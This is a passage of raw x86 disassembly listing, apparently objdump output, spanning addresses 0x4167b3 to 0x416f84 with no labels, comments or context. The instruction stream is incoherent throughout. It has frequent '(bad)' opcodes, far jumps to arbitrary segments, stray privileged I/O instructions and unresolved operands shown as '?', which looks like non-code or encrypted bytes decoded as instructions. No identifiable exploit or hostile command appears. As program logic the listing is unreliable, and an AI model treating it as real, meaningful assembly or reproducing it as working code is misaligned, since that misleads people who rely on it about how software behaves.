  4167b3:	cwde   
  4167b4:	shr    cl,1
  4167b6:	ret    0xbf16
  4167b9:	or     al,0x58
  4167bb:	jmp    0xcf3f66af
  4167c0:	lock cli 
  4167c2:	jne    0x4167cb
  4167c4:	push   ds
  4167c5:	push   0x7f08732f
  4167ca:	inc    DWORD PTR [edi*8+0x30d2f5d0]
  4167d1:	inc    esp
  4167d2:	cmp    BYTE PTR [ecx-0xaaf7ddb],bl
  4167d8:	fisttp DWORD PTR [ecx+0xb]
  4167db:	jmp    0xf378f5b7
  4167e0:	add    ebx,DWORD PTR [edi]
  4167e2:	shl    DWORD PTR [ecx+0x53633e88],1
  4167e8:	test   BYTE PTR [edi+0x64],ch
  4167eb:	push   ds
  4167ec:	lock xor al,0xa5
  4167ef:	jae    0x416813
  4167f1:	dec    eax
  4167f2:	adc    bh,BYTE PTR [ebx-0x50]
  4167f5:	or     al,BYTE PTR [ecx]
  4167f7:	rcr    DWORD PTR [ebp+esi*1-0x49],0xd9
  4167fc:	fstp   TBYTE PTR [eax-0x49]
  4167ff:	pop    edi
  416800:	jno    0x416785
  416802:	mov    bl,0x54
  416804:	add    DWORD PTR [esi+0x3f],edx
  416807:	sub    DWORD PTR [ebx+0x5d18d9be],ebx
  41680d:	push   es
  41680e:	push   edx
  41680f:	fcom   DWORD PTR [edx]
  416811:	dec    ebx
  416812:	xchg   ebx,eax
  416813:	inc    esi
  416814:	cwde   
  416815:	je     0x41683a
  416817:	push   bp
  416819:	or     dl,BYTE PTR [eax+0x66]
  41681c:	jmp    0xd59c6d2f
  416821:	jo     0x416867
  416823:	add    eax,0x8b733533
  416828:	mov    ds:0x45515809,al
  41682d:	xor    eax,DWORD PTR [ebp+0x42]
  416830:	lock int3 
  416832:	mov    ebp,0xe011a299
  416837:	mov    edi,0x4f3666e8
  41683c:	in     al,dx
  41683d:	or     dl,BYTE PTR [ebp-0x7]
  416840:	pop    ds
  416841:	loop   0x4168a9
  416843:	jmp    0x5f29:0xc517a3bf
  41684a:	sub    edx,0xffffffdf
  41684d:	xchg   eax,eax
  41684f:	rcl    DWORD PTR [edx],1
  416851:	jbe    0x416860
  416853:	sub    BYTE PTR [edx+0x3a],dl
  416856:	adc    bh,BYTE PTR [edi-0x51d69954]
  41685c:	aad    0x3e
  41685e:	and    DWORD PTR [edi-0x5c810369],edi
  416864:	adc    bl,BYTE PTR [ecx-0x7e]
  416867:	leave  
  416868:	push   es
  416869:	mov    al,ds:0xe6136bf1
  41686e:	test   BYTE PTR [edi],dh
  416870:	mov    DWORD PTR [edx],ebp
  416872:	data16 mov ch,0x39
  416875:	sub    al,0x25
  416877:	ja     0x41682e
  416879:	cld    
  41687a:	sbb    bl,BYTE PTR [ecx]
  41687c:	stos   BYTE PTR es:[edi],al
  41687d:	je     0x416895
  41687f:	adc    eax,0x6007d7de
  416884:	(bad)  
  416885:	cmp    BYTE PTR [esi],al
  416887:	sub    al,0x66
  41688a:	in     al,dx
  41688b:	mov    dl,0x98
  41688d:	sub    edi,DWORD PTR [edi]
  41688f:	inc    ebp
  416890:	xchg   esp,eax
  416891:	fwait
  416892:	cdq    
  416893:	add    al,0x7e
  416895:	dec    esi
  416896:	fistp  DWORD PTR [edx-0x3b686ca0]
  41689c:	fcmove st,st(6)
  41689e:	sub    cl,BYTE PTR [eax-0x6b08920a]
  4168a4:	xor    BYTE PTR [ebx+ebp*1+0x33],dl
  4168a8:	cmp    DWORD PTR [eax],esp
  4168aa:	xor    DWORD PTR [ebp-0x18c2e6e9],edx
  4168b0:	mov    esp,?
  4168b2:	pop    edi
  4168b3:	in     eax,dx
  4168b4:	adc    ah,dl
  4168b6:	mov    edi,0xf58fea82
  4168bb:	sub    BYTE PTR [edx],bl
  4168bd:	ss pop edx
  4168bf:	or     ebx,DWORD PTR [ebx+0x5e]
  4168c2:	jne    0x41685a
  4168c4:	dec    esi
  4168c5:	fidiv  DWORD PTR [ebx-0x72ef730d]
  4168cb:	in     eax,0xc
  4168cd:	xchg   edx,eax
  4168ce:	or     ecx,edi
  4168d0:	pop    edi
  4168d1:	(bad)  ds:0x34dca323
  4168d7:	fstp   TBYTE PTR [edx+0x42]
  4168da:	fcom   DWORD PTR [ebp+0x61025c75]
  4168e0:	cmp    BYTE PTR [edi-0x61],ah
  4168e3:	(bad)  
  4168e5:	movsx  esi,sp
  4168e8:	push   ecx
  4168e9:	dec    eax
  4168ea:	sub    esp,DWORD PTR [ecx-0x2d]
  4168ed:	out    dx,eax
  4168ee:	sbb    eax,0x963479e8
  4168f3:	jmp    0x8c79:0x4d1bb9a5
  4168fa:	xchg   ebx,eax
  4168fb:	out    dx,al
  4168fc:	(bad)  
  4168fe:	pop    es
  4168ff:	adc    al,0x5a
  416901:	aas    
  416902:	dec    edx
  416903:	leave  
  416904:	inc    ebx
  416905:	inc    ecx
  416906:	daa    
  416907:	stos   BYTE PTR es:[edi],al
  416908:	and    eax,0xb42be049
  41690d:	pop    ebx
  41690e:	cmp    al,0xca
  416910:	sbb    DWORD PTR [eax+0x5d],ecx
  416913:	dec    ebp
  416914:	cmovle esi,DWORD PTR [ebx-0x49c678b8]
  41691b:	inc    DWORD PTR [ebp+ecx*1-0x2fe2c5f1]
  416922:	stos   DWORD PTR es:[edi],eax
  416923:	inc    edi
  416924:	fsub   DWORD PTR [esi+0x7a4cb892]
  41692a:	int    0xcf
  41692c:	imul   esi,ebx,0x21
  41692f:	and    cl,bl
  416931:	les    ebx,FWORD PTR [ebx-0x4b3ac697]
  416937:	add    eax,eax
  416939:	sahf   
  41693a:	jecxz  0x416951
  41693c:	pushf  
  41693d:	mov    dh,0xb0
  41693f:	daa    
  416940:	ror    DWORD PTR [ebx],cl
  416942:	mov    ss,esp
  416944:	mov    ecx,0xad694ffe
  416949:	sbb    al,0xa1
  41694b:	fsubr  QWORD PTR [ecx]
  41694d:	push   esp
  41694e:	(bad)  
  41694f:	std    
  416950:	sti    
  416951:	mov    esp,0x232958ad
  416956:	les    ebx,FWORD PTR [ecx+0x24]
  416959:	jae    0x4169a1
  41695b:	or     DWORD PTR [ebx-0x49],ebp
  41695e:	pop    ebx
  41695f:	popf   
  416960:	or     al,0x83
  416962:	xor    esi,esi
  416964:	fwait
  416965:	out    dx,eax
  416966:	jmp    0x416912
  416968:	push   es
  416969:	mov    ch,0x7e
  41696b:	arpl   dx,sp
  41696d:	pop    DWORD PTR [ebx-0x7b4431bf]
  416973:	scas   eax,DWORD PTR es:[edi]
  416974:	iret   
  416975:	ret    
  416976:	cmp    BYTE PTR [eax+ebp*2+0x62],ah
  41697a:	popf   
  41697b:	sbb    dh,bl
  41697d:	nop
  41697e:	rcr    BYTE PTR [ecx-0x79],cl
  416981:	retf   
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	ds push 0xffffffc3
  416996:	mov    al,ds:0x707f1fa5
  41699b:	mov    ecx,0x1470707e
  4169a0:	pop    ebx
  4169a1:	sbb    eax,0xf881cc67
  4169a6:	and    ebp,edi
  4169a8:	aas    
  4169a9:	push   0x6e7775f1
  4169ae:	jnp    0x4169b3
  4169b0:	ja     0x416966
  4169b2:	jmp    0xf9a5:0x8a74757a
  4169b9:	mov    ebp,0x681d140c
  4169be:	push   eax
  4169bf:	stos   DWORD PTR es:[edi],eax
  4169c0:	loope  0x416a1c
  4169c2:	cld    
  4169c3:	ret    0x10a
  4169c6:	mov    dh,0xeb
  4169c8:	mov    ebp,0xb209efbb
  4169cd:	sbb    DWORD PTR [edx-0x71],edi
  4169d0:	or     DWORD PTR [ebx+0x1a],eax
  4169d3:	xor    al,0x82
  4169d5:	xor    al,0x3b
  4169d7:	xchg   ecx,eax
  4169d8:	and    DWORD PTR [ebx+0x7b],ebp
  4169db:	mov    ecx,0xb55d50f8
  4169e0:	mov    dh,0x59
  4169e2:	add    BYTE PTR [ebx-0x77f9ee42],bh
  4169e8:	push   ds
  4169e9:	ds or  al,0x40
  4169ec:	or     al,BYTE PTR [esi-0x3b]
  4169ef:	stos   DWORD PTR es:[edi],eax
  4169f0:	aas    
  4169f1:	out    dx,eax
  4169f2:	call   0x8da56d14
  4169f7:	xchg   esp,edx
  4169f9:	adc    DWORD PTR [ecx],ecx
  4169fb:	pusha  
  4169fc:	xchg   DWORD PTR [edi-0x5c],edx
  4169ff:	pop    ds
  416a00:	add    eax,0xa15396e0
  416a05:	cdq    
  416a06:	pop    ecx
  416a07:	daa    
  416a08:	and    cl,cl
  416a0a:	and    al,0x54
  416a0c:	les    esi,FWORD PTR [eax-0x71]
  416a0f:	sbb    BYTE PTR [ebp+0x7a09a0c4],dl
  416a15:	mov    ds:0xc0c8bc95,eax
  416a1a:	mov    ebx,0x5e4b8df0
  416a1f:	mov    cl,0x65
  416a21:	push   edi
  416a22:	cmp    ebx,esp
  416a24:	sbb    al,0xd0
  416a26:	pop    ebx
  416a27:	xchg   ecx,eax
  416a28:	pop    ss
  416a29:	mov    bl,0xbd
  416a2b:	xor    eax,DWORD PTR [eax]
  416a2d:	loop   0x4169f9
  416a2f:	repnz inc eax
  416a31:	add    al,0xfb
  416a33:	sbb    esi,DWORD PTR [edx]
  416a35:	pop    ebx
  416a36:	popa   
  416a37:	or     DWORD PTR [di+0x467b],eax
  416a3c:	fst    DWORD PTR [edx+0x60bccb0f]
  416a42:	aas    
  416a43:	xchg   edi,eax
  416a44:	mov    BYTE PTR [edx],dl
  416a46:	dec    esp
  416a47:	xchg   DWORD PTR [edi],ebx
  416a49:	test   ebp,esi
  416a4b:	add    dl,al
  416a4d:	mov    DWORD PTR [ebx-0x2],0x25d80870
  416a54:	pop    eax
  416a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a56:	idiv   DWORD PTR [esp+edi*1-0x8]
  416a5a:	enter  0x9474,0xdf
  416a5e:	jmp    0x416a81
  416a60:	sbb    edx,DWORD PTR [esi-0x2d4032ad]
  416a66:	add    ah,BYTE PTR [eax-0x165679b1]
  416a6c:	push   esp
  416a6d:	idiv   BYTE PTR [ecx+0x427ab4d1]
  416a73:	cmp    al,0x39
  416a75:	sub    DWORD PTR [edi],esp
  416a77:	ret    
  416a78:	sub    eax,0x479d0437
  416a7d:	cmp    al,0xb7
  416a7f:	(bad)  
  416a80:	sub    DWORD PTR [eax-0x44],edi
  416a83:	(bad)  
  416a85:	les    ebp,FWORD PTR [edx+edx*4-0x6c200b75]
  416a8c:	ret    0x8fcc
  416a8f:	dec    edi
  416a90:	lahf   
  416a91:	cdq    
  416a92:	popf   
  416a93:	cmp    eax,0x21738858
  416a98:	jns    0x416a6e
  416a9a:	push   ss
  416a9b:	sub    esi,DWORD PTR [ebx]
  416a9d:	add    bl,ch
  416a9f:	hlt    
  416aa0:	daa    
  416aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa2:	pop    ss
  416aa3:	and    edx,ecx
  416aa5:	mov    WORD PTR [ebx],ss
  416aa7:	dec    edx
  416aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa9:	mov    al,BYTE PTR [edx]
  416aab:	and    ah,BYTE PTR [ebp-0x54ea586a]
  416ab1:	lock pop esi
  416ab3:	and    al,0x37
  416ab5:	inc    ebx
  416ab6:	ret    
  416ab7:	dec    edi
  416ab8:	add    DWORD PTR [ecx-0x32cdf772],esi
  416abe:	rcr    DWORD PTR [edx-0x24ef2b30],1
  416ac4:	popf   
  416ac5:	cmc    
  416ac6:	xchg   ebp,eax
  416ac7:	cmp    ah,BYTE PTR [ebx+ecx*1-0xfe66282]
  416ace:	sbb    edx,DWORD PTR [eax]
  416ad0:	jno    0x416a8f
  416ad2:	inc    eax
  416ad3:	or     edx,DWORD PTR [ecx+0x727f4a30]
  416ad9:	jmp    0x1b30:0x787a9cb8
  416ae0:	dec    eax
  416ae1:	sub    ebp,DWORD PTR [eax-0x4d]
  416ae4:	mov    cs,WORD PTR [ebp+0x60]
  416ae7:	test   al,0x74
  416ae9:	add    DWORD PTR [ebp-0x470efe5f],ebp
  416aef:	mov    bl,0x40
  416af1:	fwait
  416af2:	jmp    0x416abc
  416af4:	sbb    BYTE PTR [esi-0x7e],bh
  416af7:	add    BYTE PTR [ebp+0x51],cl
  416afa:	rcr    DWORD PTR [edx+0x3ee3c6f0],1
  416b00:	mov    cl,BYTE PTR [esi]
  416b02:	arpl   WORD PTR [ecx-0x2de6f75],bp
  416b08:	sti    
  416b09:	push   ss
  416b0a:	ror    eax,1
  416b0c:	jmp    0x32cc:0xf5e4f1a2
  416b13:	xor    al,0xa1
  416b15:	xor    DWORD PTR [esi-0x55bfa1ed],edi
  416b1b:	mov    ds:0x51fe65e7,al
  416b20:	mov    es,WORD PTR [eax-0x6f1a1854]
  416b26:	adc    eax,0x74da04cf
  416b2b:	push   es
  416b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b2d:	cmp    eax,0xe31a3783
  416b32:	dec    edi
  416b33:	fcomp  DWORD PTR [edi-0x65]
  416b36:	mov    DWORD PTR [ebx-0x6ff235d9],esi
  416b3c:	push   edx
  416b3d:	mov    bl,0xc
  416b3f:	push   ss
  416b40:	arpl   WORD PTR [edi],sp
  416b42:	mov    ebx,0xeeeacf3d
  416b47:	iret   
  416b48:	jae    0x416b8a
  416b4a:	sar    BYTE PTR [esi+eax*4],cl
  416b4d:	mov    eax,ds:0x65f876b4
  416b52:	jmp    0x1bea8fc
  416b57:	cmp    eax,0xc9492e3d
  416b5c:	jge    0x416b82
  416b5e:	jb     0x416b9e
  416b60:	ret    0x67a0
  416b63:	imul   BYTE PTR gs:[ebp-0x12]
  416b67:	xlat   BYTE PTR ds:[ebx]
  416b68:	lods   eax,DWORD PTR ds:[esi]
  416b69:	aad    0xae
  416b6b:	fsubr  st(0),st
  416b6d:	(bad)  
  416b6e:	cmc    
  416b6f:	data16 icebp 
  416b71:	or     al,0x6e
  416b73:	add    eax,0x62d98bb0
  416b78:	lock inc esp
  416b7a:	in     ax,0xe9
  416b7d:	push   ebx
  416b7e:	std    
  416b7f:	push   ecx
  416b80:	mov    eax,ds:0x2cbabb96
  416b85:	adc    bl,BYTE PTR [esi]
  416b87:	push   esp
  416b88:	gs pop ss
  416b8a:	test   eax,0x221e5992
  416b8f:	and    DWORD PTR [edi+esi*2],eax
  416b92:	mov    ah,0xb8
  416b94:	push   ds
  416b95:	cmp    eax,0xbcd84537
  416b9a:	pop    esp
  416b9b:	sbb    al,0x34
  416b9d:	fcom   DWORD PTR [ecx-0x10]
  416ba0:	or     al,0x9d
  416ba2:	add    al,0x21
  416ba4:	into   
  416ba5:	std    
  416ba6:	sti    
  416ba7:	push   ss
  416ba8:	scas   eax,DWORD PTR es:[edi]
  416ba9:	xchg   ebp,eax
  416baa:	mov    bl,0xd
  416bac:	mov    esp,0x3ebe1da9
  416bb1:	pop    es
  416bb2:	push   ebx
  416bb3:	shl    BYTE PTR [eax-0x551311b6],cl
  416bb9:	xor    al,0x6e
  416bbb:	out    0x83,al
  416bbd:	mov    WORD PTR [ebp+edx*4-0x6393d299],?
  416bc4:	je     0x416c25
  416bc6:	retf   0x1486
  416bc9:	pusha  
  416bca:	rcl    al,0xbe
  416bcd:	clc    
  416bce:	dec    ebx
  416bcf:	dec    eax
  416bd0:	mov    ds:0xb65cc8d3,al
  416bd5:	mov    al,0xc9
  416bd7:	jae    0x416bd7
  416bd9:	jb     0x416c14
  416bdb:	or     esp,edx
  416bdd:	sbb    edi,DWORD PTR [edx]
  416bdf:	or     dh,BYTE PTR [eax]
  416be1:	xor    DWORD PTR [ebx-0x3b],0xffffffff
  416be5:	push   edx
  416be6:	push   ebp
  416be7:	xchg   esp,eax
  416be8:	test   BYTE PTR [edx],0x7
  416beb:	inc    edx
  416bec:	mov    ds:0xafdac046,eax
  416bf1:	les    eax,FWORD PTR [bp+0x2be7]
  416bf6:	sbb    DWORD PTR [ecx-0x7cca2633],esp
  416bfc:	adc    eax,0x73d3a4a2
  416c01:	ds pop ecx
  416c03:	and    eax,0x142fcf16
  416c08:	xchg   bh,dh
  416c0a:	leave  
  416c0b:	in     al,dx
  416c0c:	mov    ah,0x16
  416c0e:	ficom  WORD PTR [ebp+0x4a]
  416c11:	mov    ?,ebx
  416c13:	push   ds
  416c14:	mov    ds,WORD PTR [edi+0x178987e6]
  416c1a:	shl    DWORD PTR [edx-0x1e9e8a72],0xd5
  416c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c22:	cmp    eax,DWORD PTR [edx-0x5]
  416c25:	dec    BYTE PTR [eax-0x4b9c7f68]
  416c2b:	xchg   edx,eax
  416c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c2d:	test   BYTE PTR [ebp+0x4c85933d],bl
  416c33:	(bad)  
  416c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c35:	and    DWORD PTR [ecx-0x42e0eeaf],esp
  416c3b:	repnz sbb edx,edx
  416c3e:	adc    bl,cl
  416c40:	push   ebx
  416c41:	lods   al,BYTE PTR ds:[esi]
  416c42:	sub    eax,0x74820424
  416c47:	push   edx
  416c48:	(bad)  
  416c49:	ficomp DWORD PTR [edx]
  416c4b:	xchg   DWORD PTR [eax-0x5],edx
  416c4e:	popf   
  416c4f:	cmp    ebx,esi
  416c51:	sbb    ch,ch
  416c53:	mov    cl,0xc7
  416c55:	hlt    
  416c56:	or     DWORD PTR [esi-0x4e],0xffffffc7
  416c5a:	inc    eax
  416c5b:	aas    
  416c5c:	outs   dx,DWORD PTR ds:[esi]
  416c5d:	fsub   DWORD PTR [ebx+0x34e87d1c]
  416c63:	jle    0x416ca8
  416c65:	pop    ds
  416c66:	dec    ecx
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	pop    esp
  416c7c:	mov    al,0x6c
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c90
  416c88:	jmp    0x65a28003
  416c8d:	jmp    0x416c5e
  416c8f:	daa    
  416c90:	fistp  DWORD PTR [ecx-0x2cb8591]
  416c96:	js     0x416c38
  416c98:	pop    esp
  416c99:	and    al,0x75
  416c9b:	dec    edx
  416c9c:	inc    ebp
  416c9d:	mov    dh,0x16
  416c9f:	cli    
  416ca0:	std    
  416ca1:	sbb    bh,BYTE PTR [ebx]
  416ca3:	jo     0x416c84
  416ca5:	sbb    al,0xc4
  416ca7:	dec    esi
  416ca8:	ret    0xa476
  416cab:	add    dh,bh
  416cad:	fwait
  416cae:	mov    bh,0x53
  416cb0:	adc    al,0x7c
  416cb2:	cmp    dh,dl
  416cb4:	or     eax,0x91bac6ca
  416cb9:	adc    BYTE PTR [eax+0x10],bl
  416cbc:	and    eax,0x336d1a5d
  416cc1:	jne    0x416cb6
  416cc3:	add    cl,BYTE PTR [edx-0x73]
  416cc6:	arpl   WORD PTR [eax],si
  416cc8:	xlat   BYTE PTR ds:[ebx]
  416cc9:	out    dx,al
  416cca:	(bad)  
  416ccc:	sub    cl,dh
  416cce:	lahf   
  416ccf:	mov    dh,0x64
  416cd1:	sub    al,0xd2
  416cd3:	cli    
  416cd4:	xlat   BYTE PTR ds:[ebx]
  416cd5:	rol    DWORD PTR [edx+edi*8-0x47],1
  416cd9:	mov    esp,0x2bb8f556
  416cde:	xor    BYTE PTR [ecx-0xe],bl
  416ce1:	dec    edi
  416ce2:	js     0x416ce8
  416ce4:	mov    dl,0xcc
  416ce6:	sti    
  416ce7:	dec    eax
  416ce8:	mov    edx,0x4c61ecf9
  416ced:	add    dl,BYTE PTR [eax]
  416cef:	add    ch,BYTE PTR [edx-0x7d22847c]
  416cf5:	repz cmp eax,0x534bff46
  416cfb:	cmp    eax,DWORD PTR [edi]
  416cfd:	push   es
  416cfe:	push   esi
  416cff:	das    
  416d00:	loopne 0x416c9a
  416d02:	std    
  416d03:	jg     0x416cf0
  416d05:	and    DWORD PTR [edx],edi
  416d07:	repnz push edi
  416d09:	ins    BYTE PTR es:[edi],dx
  416d0a:	js     0x416cea
  416d0c:	xchg   ebx,eax
  416d0d:	add    cl,0xe7
  416d10:	out    0x5a,al
  416d12:	xor    esi,esi
  416d14:	repnz (bad) 
  416d16:	in     al,dx
  416d17:	mov    esi,0x9be02ec5
  416d1c:	ja     0x416cc6
  416d1e:	jo     0x416cb6
  416d20:	test   eax,0x921f9d38
  416d25:	mov    BYTE PTR [ebx-0x51803f40],bh
  416d2b:	add    BYTE PTR [edx],dh
  416d2d:	xchg   esi,eax
  416d2e:	fimul  DWORD PTR ds:0x27bc1b7b
  416d34:	mov    ebp,0x1dea459b
  416d39:	std    
  416d3a:	cs jae 0x416d1f
  416d3d:	pop    ds
  416d3e:	rcl    BYTE PTR [esi-0x53b4eeb4],1
  416d44:	shr    BYTE PTR [edx+edi*2-0x24],1
  416d48:	jge    0x416d2a
  416d4a:	es push eax
  416d4c:	jbe    0x416d10
  416d4e:	jl     0x416d05
  416d50:	add    al,0x10
  416d52:	enter  0x6c09,0x42
  416d56:	push   cs
  416d57:	or     DWORD PTR [ecx-0x54],0xb18f77ea
  416d5e:	cli    
  416d5f:	dec    ebp
  416d60:	retf   0x52aa
  416d63:	jo     0x416cfc
  416d65:	(bad)  
  416d66:	(bad)  
  416d68:	jg     0x416d7c
  416d6a:	jno    0x416db2
  416d6c:	daa    
  416d6d:	jnp    0x416d6a
  416d6f:	mov    esp,0x99a975b8
  416d74:	sbb    BYTE PTR [eax],0xb3
  416d77:	mov    al,ds:0xe42e9685
  416d7c:	pop    ebp
  416d7d:	fist   DWORD PTR [esi-0x67]
  416d80:	xor    ah,bl
  416d82:	test   eax,0xa336d02f
  416d87:	mov    BYTE PTR [ebx-0x552f726f],dl
  416d8d:	ret    
  416d8e:	fst    DWORD PTR [ebx]
  416d90:	push   eax
  416d91:	push   edx
  416d92:	sbb    al,0x9f
  416d94:	pop    ebx
  416d95:	or     al,0x3f
  416d97:	nop
  416d98:	xchg   esp,eax
  416d99:	aam    0x7c
  416d9b:	sub    al,0x1c
  416d9d:	repnz ds cld 
  416da0:	push   esp
  416da1:	mov    eax,ds:0x7d81e925
  416da6:	lods   eax,DWORD PTR ds:[esi]
  416da7:	add    BYTE PTR [edx+0x1be55d32],ah
  416dad:	pushf  
  416dae:	adc    DWORD PTR [ecx-0x7f6e2db6],0xe15c1c75
  416db8:	mov    ebx,DWORD PTR [ebx]
  416dba:	push   ds
  416dbb:	push   ebx
  416dbc:	sub    cl,dh
  416dbe:	mov    bl,0xf8
  416dc0:	(bad)  
  416dc1:	into   
  416dc2:	pop    ss
  416dc3:	add    BYTE PTR [ebp-0xccca39f],bl
  416dc9:	cmc    
  416dca:	xor    al,0xe7
  416dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dcd:	mov    ds:0x4c04daa3,al
  416dd2:	dec    edi
  416dd3:	add    DWORD PTR [edx],0xffffffe7
  416dd6:	ret    0x1020
  416dd9:	and    esi,ebp
  416ddb:	cwde   
  416ddc:	jbe    0x416d95
  416dde:	sbb    edi,DWORD PTR [edx]
  416de0:	mov    bl,0xc5
  416de2:	dec    ebp
  416de3:	push   0xf0c31b8c
  416de8:	dec    eax
  416de9:	or     al,al
  416deb:	out    dx,al
  416dec:	out    dx,al
  416ded:	xchg   ebp,edx
  416def:	sbb    ah,BYTE PTR [ebx]
  416df1:	int3   
  416df2:	mov    cl,0x45
  416df4:	pop    ecx
  416df5:	jns    0x416deb
  416df7:	mov    bl,0x50
  416df9:	jle    0x416d7e
  416dfb:	fmul   st,st(5)
  416dfd:	mov    cl,0x76
  416dff:	mov    cl,0x8f
  416e01:	mov    esp,0x7e5f26f9
  416e06:	push   esi
  416e07:	jl     0x416dda
  416e09:	xchg   edx,eax
  416e0a:	push   cs
  416e0b:	pop    ebp
  416e0c:	ror    DWORD PTR [eax+ebp*4],0x4b
  416e10:	outs   dx,DWORD PTR gs:[esi]
  416e12:	mov    ds:0xd177bec3,al
  416e17:	mov    ecx,esp
  416e19:	or     BYTE PTR [edi+0x38cad462],ah
  416e1f:	daa    
  416e20:	mov    DWORD PTR [eax+0x3d],ebp
  416e23:	add    bh,ah
  416e25:	mov    ds:0x1e46d589,eax
  416e2a:	and    eax,0xe28308dd
  416e2f:	mov    ah,0x49
  416e31:	std    
  416e32:	dec    edx
  416e33:	lahf   
  416e34:	retf   0x171a
  416e37:	jmp    0x416ea6
  416e39:	stos   BYTE PTR es:[edi],al
  416e3a:	je     0x416df7
  416e3c:	mov    ebx,0xa40d7a74
  416e41:	in     al,0xee
  416e43:	shr    cl,0x46
  416e46:	jge    0x416eaf
  416e48:	xchg   ecx,eax
  416e49:	enter  0xd08d,0x3e
  416e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e4e:	inc    edx
  416e4f:	shufps xmm1,XMMWORD PTR [edx-0x1a],0x67
  416e54:	rcl    BYTE PTR [edx+0x4a433ff5],0xc
  416e5b:	nop
  416e5c:	push   cs
  416e5d:	mov    esp,0x50f939af
  416e62:	jmp    0xa554b882
  416e67:	and    ecx,DWORD PTR [edx-0x9]
  416e6a:	in     eax,0x98
  416e6c:	xchg   edi,eax
  416e6d:	lds    edx,FWORD PTR [ecx]
  416e6f:	ret    
  416e70:	mov    edi,0x176b4fad
  416e75:	std    
  416e76:	ja     0x416e57
  416e78:	sbb    eax,DWORD PTR [ebx-0x36]
  416e7b:	ret    0x432a
  416e7e:	inc    ebp
  416e7f:	ja     0x416efa
  416e81:	pop    edi
  416e82:	add    BYTE PTR [edx],0x95
  416e85:	dec    esp
  416e86:	pop    edi
  416e87:	mul    ah
  416e89:	inc    edi
  416e8a:	mov    esp,0x44cba166
  416e8f:	hlt    
  416e90:	stc    
  416e91:	sub    BYTE PTR [edx+0x10],0x6a
  416e95:	ud1    ebx,DWORD PTR [edx]
  416e98:	mov    dh,0x6b
  416e9a:	push   ss
  416e9b:	xor    BYTE PTR [esp+ebx*4],bh
  416e9e:	mov    ah,0xf
  416ea0:	xchg   ch,bl
  416ea2:	sar    BYTE PTR [esi+0x40],cl
  416ea5:	iret   
  416ea6:	push   ebp
  416ea7:	add    di,dx
  416eaa:	aaa    
  416eab:	pop    ebp
  416eac:	inc    eax
  416ead:	loop   0x416e9e
  416eaf:	js     0x416f26
  416eb1:	ret    
  416eb2:	cmp    al,0x79
  416eb4:	inc    ecx
  416eb5:	pop    esi
  416eb6:	test   eax,0x78214759
  416ebb:	sbb    eax,0x9fc8b701
  416ec0:	cwde   
  416ec1:	fsubr  DWORD PTR [ebp+0x2934de6e]
  416ec7:	enter  0xb326,0x6c
  416ecb:	and    al,BYTE PTR [ecx-0x46]
  416ece:	rcl    DWORD PTR [ebp+0x14],0x29
  416ed2:	xchg   BYTE PTR [esp+eiz*4-0x27d319d7],bh
  416ed9:	scas   al,BYTE PTR es:[edi]
  416eda:	rcr    DWORD PTR [eax+0x616eb0b0],0x42
  416ee1:	or     dl,BYTE PTR [edx]
  416ee3:	mov    ds:0x14687f8d,al
  416ee8:	in     eax,dx
  416ee9:	jae    0x416e9c
  416eeb:	mov    ds:0x91ddba1d,al
  416ef0:	sbb    bh,BYTE PTR [esi+0x140d32e]
  416ef6:	sub    eax,0x815c4458
  416efb:	out    dx,al
  416efc:	push   edx
  416efd:	dec    ebp
  416efe:	xchg   ah,ch
  416f00:	pushf  
  416f01:	xor    BYTE PTR [edi+esi*2+0x3af11317],0xa
  416f09:	stos   DWORD PTR es:[edi],eax
  416f0a:	js     0x416f1d
  416f0c:	js     0x416ec5
  416f0e:	jl     0x416e95
  416f10:	cmp    dh,BYTE PTR [ebx]
  416f12:	mov    ah,0xb5
  416f14:	lock mov esi,0x27d46ce6
  416f1a:	adc    eax,0xc84e6f25
  416f1f:	stos   DWORD PTR es:[edi],eax
  416f20:	mov    al,ds:0x8ba61bb0
  416f25:	dec    ecx
  416f26:	je     0x416f24
  416f28:	(bad)  
  416f29:	repz mov esp,ecx
  416f2c:	xchg   BYTE PTR [ecx+0x401b5054],cl
  416f32:	push   edi
  416f33:	retf   
  416f34:	inc    eax
  416f35:	in     al,0xe8
  416f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f38:	xor    BYTE PTR [ebp+0xb],dl
  416f3b:	imul   esi,ecx,0x7bf5a9f7
  416f41:	push   ebp
  416f42:	sahf   
  416f43:	push   ecx
  416f44:	or     ebx,DWORD PTR [eax-0x6c0546bb]
  416f4a:	mov    al,ds:0xf4531cb
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	pop    ebx
  416f6b:	repz push ds
  416f6d:	shl    DWORD PTR [edi],cl
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xf170707e
  416f77:	inc    ebp
  416f78:	sar    edi,1
  416f7a:	and    al,0x94
  416f7c:	jmp    0x416fb7
  416f7e:	sbb    DWORD PTR [edx-0x53efbe4c],edi
  416f84:	dec    esi
